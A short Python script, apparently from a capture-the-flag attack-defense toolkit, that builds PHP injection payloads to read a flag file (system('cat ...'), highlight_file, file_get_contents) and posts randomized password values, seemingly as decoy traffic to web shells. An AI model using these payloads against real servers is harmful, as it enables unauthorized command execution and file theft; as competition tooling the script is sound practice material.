# -*- coding: utf-8 -*-
# author: p0desta

import requests
import random
import hashlib
def MD5(s):
    m = hashlib.md5()
    m.update(s)
    return m.hexdigest()

def send_fake_payloads(flag_path):
    payloads = []
    payloads.append('system("cat %s");' % (flag_path))
    payloads.append('highlight_file("%s");' % (flag_path))
    payloads.append('echo file_get_contents("%s");' % (flag_path))
    payloads.append('var_dump(file_get_contents("%s"));' % (flag_path))
    payloads.append('print_r(file_get_contents("%s"));' % (flag_path))
    return payloads
def send_fake_passwd(url,data):
    for i in range(1,random.randint(3,5)):
        data['pass'] = MD5(str(random.random()))
        content = requests.post(url=url,data=data)